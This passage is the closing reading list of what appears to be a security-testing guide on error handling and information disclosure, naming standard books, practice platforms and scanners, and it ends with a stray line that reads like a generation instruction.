            'level': 'ERROR',
            'propagate': True,
        },
    },
}
```

---

# Module 10: Further Reading

## Books and Resources

1. **"The Web Application Hacker's Handbook"** - Error handling chapters
2. **OWASP Testing Guide** - Information disclosure testing
3. **PortSwigger Web Security Academy** - Error-based vulnerabilities
4. **CWE-209** - Generation of Error Message Containing Sensitive Information

## Practice Platforms

- **DVWA** - Error handling challenges
- **Juice Shop** - Information disclosure vulnerabilities
- **WebGoat** - Error handling lessons
- **HackTheBox** - Web challenges

## Tools

- **Burp Suite** - Error response analysis
- **OWASP ZAP** - Automated error detection
- **Nikto** - Web server scanner
- **Dirb/Gobuster** - Directory enumeration for debug endpoints

---

*This learning guide provides a comprehensive foundation for error handling and information disclosure security testing. Practice on real applications and study disclosed vulnerabilities to develop expertise.*

Ensure learning materials are comprehensive, practical, and focused on developing expert-level error handling security assessment skills.